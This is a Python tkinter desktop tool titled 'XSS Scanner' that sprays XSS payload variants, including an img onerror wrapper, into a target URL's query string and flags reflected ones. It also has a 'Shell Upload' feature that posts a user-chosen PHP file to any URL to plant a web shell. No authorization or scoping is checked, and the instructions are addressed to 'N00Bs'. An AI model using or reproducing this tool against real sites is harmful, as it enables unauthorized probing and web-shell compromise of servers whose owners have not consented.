import tkinter as tk
from tkinter import messagebox, filedialog
from tkinter import ttk
import requests
import threading
import datetime
import time
import sqlite3
import re
import logging
import webbrowser

# Logging setup
logging.basicConfig(filename='xss_scanner.log', level=logging.INFO)
error_logger = logging.getLogger('error_logger')
error_handler = logging.FileHandler('error.log')
error_handler.setLevel(logging.ERROR)
error_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
error_handler.setFormatter(error_formatter)
error_logger.addHandler(error_handler)

# Function to load XSS payloads
def load_payloads(file_path, batch_size=100):
    try:
        with open(file_path, 'r') as file:
            while True:
                batch = [line.strip() for _, line in zip(range(batch_size), file) if line.strip()]
                if not batch:
                    break
                yield batch
    except FileNotFoundError:
        messagebox.showerror("Error", f"File '{file_path}' not found.")

# XSS bypass payloads
def xss_bypass_payloads(payload):
    return [
        payload,
        payload.replace("<", "&lt;").replace(">", "&gt;"),
        payload.replace('"', '&quot;').replace("'", '&#x27;'),
        f'%3C{payload}%3E',
        f'<img src="x" onerror="{payload}">',
    ]

# Save results to file
def save_results():
    results = results_text.get(1.0, tk.END)
    if results.strip():
        filename = f"xss_scan_results_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as file:
            file.write(results)
        messagebox.showinfo("Saved", f"Results saved to '{filename}'")
    else:
        messagebox.showerror("Error", "No results to save.")

# Validate URL
def validate_url(url):
    regex = re.compile(r'^https?://[^\s/$.?#].[^\s]*$')
    return re.match(regex, url)

# Scan for XSS vulnerabilities
def scan_xss():
    url = url_entry.get()
    if not url:
        messagebox.showerror("Error", "Please enter a URL")
        return
    if not validate_url(url):
        messagebox.showerror("Error", "Invalid URL format")
        return

    progress_bar["value"] = 0
    results_text.delete(1.0, tk.END)
    results_text.insert(tk.END, f"Scanning {url} for XSS vulnerabilities...\n\n")

    scan_button.config(state="disabled")
    stop_button.config(state="normal")
    pause_button.config(state="normal")

    stop_event.clear()
    is_paused.clear()

    def run_scan():
        # Database setup in the scanning thread
        conn = sqlite3.connect('xss_scan.db')
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                payload TEXT,
                result TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

        batch_size = 100
        total_payloads = 0
        vulnerabilities_found = False
        seen_payloads = set()

        headers = {"User-Agent": "XSSScanner/1.0"}

        for batch in load_payloads('xss.txt', batch_size=batch_size):
            if stop_event.is_set():
                results_text.insert(tk.END, "\nScan stopped.\n")
                break

            while is_paused.is_set():
                time.sleep(0.1)

            for payload in batch:
                if stop_event.is_set():
                    results_text.insert(tk.END, "\nScan stopped.\n")
                    break

                for bypassed_payload in xss_bypass_payloads(payload):
                    if bypassed_payload in seen_payloads:
                        continue

                    seen_payloads.add(bypassed_payload)

                    try:
                        full_url = f"{url}{bypassed_payload}"
                        response = requests.get(full_url, headers=headers)

                        if bypassed_payload in response.text:
                            results_text.insert(tk.END, f"[Vulnerable] Payload: {bypassed_payload}\n")
                            vulnerabilities_found = True
                            cursor.execute("INSERT INTO scan_results (url, payload, result) VALUES (?, ?, ?)",
                                           (url, bypassed_payload, "Vulnerable"))
                            conn.commit()
                        else:
                            continue
                    except requests.RequestException as e:
                        error_logger.error(f"Error scanning with payload {bypassed_payload}: {str(e)}")
                        results_text.insert(tk.END, f"Error scanning with payload {bypassed_payload}: {str(e)}\n")
                    except Exception as e:
                        error_logger.error(f"Unexpected error: {str(e)}")
                        results_text.insert(tk.END, f"Unexpected error: {str(e)}\n")

                total_payloads += 1
                progress_bar["value"] += 1
                progress_label.config(text=f"Scan Progress: {total_payloads} payloads tested")
                time.sleep(0.01)

            if stop_event.is_set():
                break

        if not vulnerabilities_found:
            results_text.insert(tk.END, "No vulnerabilities found.\n")
        else:
            results_text.insert(tk.END, "\nScan completed. Vulnerabilities found.")

        cursor.close()
        conn.close()
        scan_button.config(state="normal")
        stop_button.config(state="disabled")
        pause_button.config(state="disabled")
        reset_button.config(state="normal")
        save_button.config(state="normal")

    threading.Thread(target=run_scan).start()

def pause_resume_scan():
    if pause_button['text'] == 'Pause Scan':
        is_paused.set()
        pause_button.config(text="Resume Scan")
    else:
        is_paused.clear()
        pause_button.config(text="Pause Scan")

def clear_results():
    results_text.delete(1.0, tk.END)

def stop_scan():
    stop_event.set()
    stop_button.config(state="disabled")

def reset_gui():
    url_entry.delete(0, tk.END)
    clear_results()
    progress_bar["value"] = 0
    progress_label.config(text="Scan Progress: 0 payloads tested")
    stop_event.clear()
    scan_button.config(state="normal")
    stop_button.config(state="disabled")
    pause_button.config(state="disabled", text="Pause Scan")
    reset_button.config(state="disabled")
    save_button.config(state="disabled")
    loading_label.config(text="")

def toggle_theme():
    if style.theme_use() == "default":
        style.theme_use("clam")
        root.config(bg="#2D2D2D")
        url_label.config(bg="#2D2D2D", fg="white")
        loading_label.config(bg="#2D2D2D", fg="white")
        progress_label.config(bg="#2D2D2D", fg="white")
        theme_button.config(text="Switch to Light Mode")
    else:
        style.theme_use("default")
        root.config(bg="white")
        url_label.config(bg="white", fg="black")
        loading_label.config(bg="white", fg="black")
        progress_label.config(bg="white", fg="black")
        theme_button.config(text="Switch to Dark Mode")

# Placeholder management
def clear_placeholder(event):
    if url_entry.get() == "http://www.site.com/index.php?id=":
        url_entry.delete(0, tk.END)

def add_placeholder(event):
    if url_entry.get() == "":
        url_entry.insert(0, "http://www.site.com/index.php?id=")

# Show instructions in a popup
def show_instructions():
    instructions = (
        "XSS Scanner Instructions:\n\n"
        "1. Enter the URL you want to scan for XSS vulnerabilities in the input box.\n"
        "   Example: http://www.site.com/index.php?id=\n\n"
        "2. Click on 'Scan for XSS' to start the scanning process.\n"
        "3. You can pause the scan at any time by clicking 'Pause Scan'.\n"
        "   To resume, click 'Resume Scan'.\n\n"
        "4. To stop the scan, click 'Stop Scan'.\n\n"
        "5. Once the scan is complete, you can save the results by clicking 'Save Results'.\n\n"
        "6. Use the 'Reset' button to clear the input and results.\n\n"
        "7. You can switch between Dark and Light mode using the theme button."
    )
    messagebox.showinfo("Instructions", instructions)

# Open GitHub link
def open_github():
    webbrowser.open("https://github.com/dotdesh71/XSS-Scanner")

# Open Patreon link
def open_patreon():
    webbrowser.open("https://www.patreon.com/Dotdesh")

# Shell upload functionality
def upload_shell():
    url = url_entry.get()
    if not url:
        messagebox.showerror("Error", "Please enter a URL")
        return
    if not validate_url(url):
        messagebox.showerror("Error", "Invalid URL format")
        return

    # Ask user for the shell file
    file_path = filedialog.askopenfilename(title="Select Shell Script", filetypes=[("PHP files", "*.php"), ("All files", "*.*")])
    if not file_path:
        return  # User canceled the file dialog

    try:
        with open(file_path, 'rb') as shell_file:
            files = {'file': shell_file}
            response = requests.post(url, files=files)
            if response.status_code == 200:
                results_text.insert(tk.END, f"[Success] Shell uploaded to {url}\n")
            else:
                results_text.insert(tk.END, f"[Failed] Unable to upload shell: {response.status_code} - {response.text}\n")
    except Exception as e:
        error_logger.error(f"Error uploading shell: {str(e)}")
        results_text.insert(tk.END, f"Error uploading shell: {str(e)}\n")

# Initialize main window
root = tk.Tk()
root.title("XSS Scanner - v1.0.1 by Retr0")
style = ttk.Style()
style.theme_use("default")

# Placeholder for stop and pause events
stop_event = threading.Event()
is_paused = threading.Event()

# UI Components
url_label = tk.Label(root, text="Enter URL:", font=("Arial", 12))
url_label.pack(pady=10)

url_entry = tk.Entry(root, font=("Arial", 12), width=40)
url_entry.pack()
url_entry.insert(0, "http://www.site.com/index.php?id=")
url_entry.bind("<FocusIn>", clear_placeholder)
url_entry.bind("<FocusOut>", add_placeholder)

# Progress bar
progress_bar = ttk.Progressbar(root, orient="horizontal", length=500, mode="determinate")
progress_bar.pack(pady=20)

# Progress label
progress_label = tk.Label(root, text="Scan Progress: 0 payloads tested", font=("Arial", 10))
progress_label.pack()

# Results text area
results_text = tk.Text(root, height=15, width=80, font=("Arial", 10), wrap=tk.WORD)
results_text.pack(padx=20, pady=10)

# Loading label
loading_label = tk.Label(root, text="", font=("Arial", 10))
loading_label.pack()

# Button frame
button_frame = tk.Frame(root)
button_frame.pack(pady=10)

# Buttons
scan_button = tk.Button(button_frame, text="Scan for XSS", command=scan_xss, font=("Arial", 10), width=12)
scan_button.grid(row=0, column=0, padx=5, pady=5)

stop_button = tk.Button(button_frame, text="Stop Scan", command=stop_scan, font=("Arial", 10), width=12, state="disabled")
stop_button.grid(row=0, column=1, padx=5, pady=5)

pause_button = tk.Button(button_frame, text="Pause Scan", command=pause_resume_scan, font=("Arial", 10), width=12, state="disabled")
pause_button.grid(row=0, column=2, padx=5, pady=5)

reset_button = tk.Button(button_frame, text="Reset", command=reset_gui, font=("Arial", 10), width=12)
reset_button.grid(row=0, column=3, padx=5, pady=5)

save_button = tk.Button(button_frame, text="Save Results", command=save_results, font=("Arial", 10), width=12, state="disabled")
save_button.grid(row=0, column=4, padx=5, pady=5)

# Shell upload button
upload_button = tk.Button(button_frame, text="Shell Upload", command=upload_shell, font=("Arial", 10), width=12)
upload_button.grid(row=0, column=5, padx=5, pady=5)

# Additional buttons in one line
additional_button_frame = tk.Frame(root)
additional_button_frame.pack(pady=10)

# Theme toggle button
theme_button = tk.Button(additional_button_frame, text="Switch to Dark Mode", command=toggle_theme, font=("Arial", 10))
theme_button.grid(row=0, column=0, padx=5)

# Instructions button
instructions_button = tk.Button(additional_button_frame, text="Instructions For N00Bs", command=show_instructions, font=("Arial", 10))
instructions_button.grid(row=0, column=1, padx=5)

# GitHub button
github_button = tk.Button(additional_button_frame, text="GitHub", command=open_github, font=("Arial", 10))
github_button.grid(row=0, column=2, padx=5)

# Patreon button
patreon_button = tk.Button(additional_button_frame, text="Support Us on Patreon", command=open_patreon, font=("Arial", 10))
patreon_button.grid(row=0, column=3, padx=5)

# Run the application
root.mainloop()
